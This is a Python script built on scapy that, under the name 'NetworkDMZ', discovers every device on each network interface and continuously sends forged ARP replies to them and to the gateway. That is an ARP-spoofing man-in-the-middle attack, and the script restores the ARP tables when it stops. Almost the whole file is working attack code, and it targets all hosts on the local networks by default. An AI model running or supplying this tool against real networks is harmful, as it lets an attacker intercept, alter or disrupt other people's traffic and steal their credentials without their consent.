import scapy.all as scapy
import time
import threading

from get_devices import devices_on_ifaces

class NetworkDMZ():

    def __init__(self, gateway_ip) -> None:
        self._gateway_ip = gateway_ip
        self._terminate_dmz = None
        self.dmz_thread = None
        self.mac_cache = {}

    def cache_macaddresses(self, device_list):

        for ip, mac in device_list:
            self.mac_cache[ip] = mac

    def get_mac(self, ip):
        arp_request = scapy.ARP(pdst = ip)
        broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]

        if len(answered_list) == 0:
            print("No answer for", ip)
            return None

        self.mac_cache[ip] = answered_list[0][1].hwsrc
        return answered_list[0][1].hwsrc
    
    def spoof(self, target_ip, spoof_ip):

        if target_ip in self.mac_cache.keys():
            dst_mac = self.mac_cache[target_ip]
        else:
            dst_mac = self.get_mac(target_ip)
        if dst_mac == None:
            return
        packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = dst_mac, psrc = spoof_ip)
        scapy.send(packet, verbose = False)
    
    
    def restore(self, destination_ip, source_ip):
        destination_mac = self.get_mac(destination_ip)
        source_mac = self.get_mac(source_ip)
        packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
        scapy.send(packet, verbose = False)
   
    def _start(self, target_ips, sleep):
        while True:
            if self._terminate_dmz:
                break

            for target_ip in target_ips:
                self.spoof(target_ip, self._gateway_ip)
                self.spoof(self._gateway_ip, target_ip)
                time.sleep(sleep)

        for target_ip in target_ips:
            self.restore(self._gateway_ip, target_ip)
            self.restore(target_ip, self._gateway_ip)

    def start(self, target_ips, sleep = 2):
        self.dmz_thread = threading.Thread(target=self._start, args=(target_ips,sleep, ))
        self.dmz_thread.start()

    def stop(self):
        self._terminate_dmz = True


dmzs = []

for _, devices in devices_on_ifaces():
    dmz = NetworkDMZ(devices[0][0])
    dmz.cache_macaddresses(devices[1:])
    ips = [x for x, _ in devices[1:]]
    dmz.start(ips)
    print("Started DMZ on network with gateway", dmz._gateway_ip)
    dmzs.append(dmz)
  
# try:
#     net_dmz.start(["192.168.132.115", "192.168.132.124", "192.168.132.249"])
# except KeyboardInterrupt:
#     print("\nCtrl + C pressed.............Exiting")
#     net_dmz.stop()
#     print("[+] Arp Spoof Stopped")

input("Press Enter to stop")

for dmz in dmzs:
    dmz.stop()
    print("Stopped DMZ on network with gateway", dmz._gateway_ip)